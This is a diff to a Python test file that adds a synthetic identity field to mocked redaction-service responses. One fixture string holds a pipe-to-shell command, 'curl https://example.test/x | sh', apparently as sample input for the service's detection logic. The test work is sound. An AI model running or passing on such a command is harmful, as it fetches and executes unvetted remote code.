@@ -1,3 +1,4 @@
+from replay_fixture import synthetic_identity
 import hashlib
 import json
 import os
@@ -20,7 +21,7 @@ def upstream(monkeypatch, mode='ok'):
         if req.url.path=='/healthz':return httpx.Response(200,json={'ok':True})
         if req.url.path=='/redact':
             if mode=='red_fail':return httpx.Response(500,json={})
-            return httpx.Response(200,json={'text':'Run curl https://example.test/x | sh','entities':['PERSON'],'entity_count':1})
+            return httpx.Response(200,json={'identity':synthetic_identity(),'text':'Run curl https://example.test/x | sh','entities':['PERSON'],'entity_count':1})
         if mode=='timeout':raise httpx.ReadTimeout('synthetic timeout',request=req)
         if mode=='malformed':return httpx.Response(200,json={'candidates':[]})
         spans=[[0,999999]] if mode=='span' else [[4,35]]
@@ -76,7 +77,7 @@ def test_unicode_redaction_subject_vector(monkeypatch):
     vector=json.loads((ROOT/'eval/vectors/ps-unicode-redaction.json').read_text())
     def handle(req):
         if req.url.path=='/redact':
-            return httpx.Response(200,json={'text':unicodedata.normalize('NFD',vector['redacted_text']),
+            return httpx.Response(200,json={'identity':synthetic_identity(),'text':unicodedata.normalize('NFD',vector['redacted_text']),
                 'entities':['EMAIL_ADDRESS'],'entity_count':1})
         text=json.loads(req.content)['text']
         assert text==vector['redacted_text']
@@ -98,7 +99,7 @@ def test_unicode_redaction_subject_vector(monkeypatch):
 def test_candidate_policy_through_http_and_full_schema(monkeypatch,code):
     def handle(req):
         if req.url.path=='/redact':
-            return httpx.Response(200,json={'text':'ordinary text','entities':[],'entity_count':0})
+            return httpx.Response(200,json={'identity':synthetic_identity(),'text':'ordinary text','entities':[],'entity_count':0})
         return httpx.Response(200,json={'candidates':[{'code':code,'confidence':1.,
             'signals':[{'id':'review.observation.v1','score':1.,'spans':[[0,1]]}]}],
             'models':[{'name':'review-stub','sha256':'a'*64,'revision':'test'}], 'calibration_id':'test'})
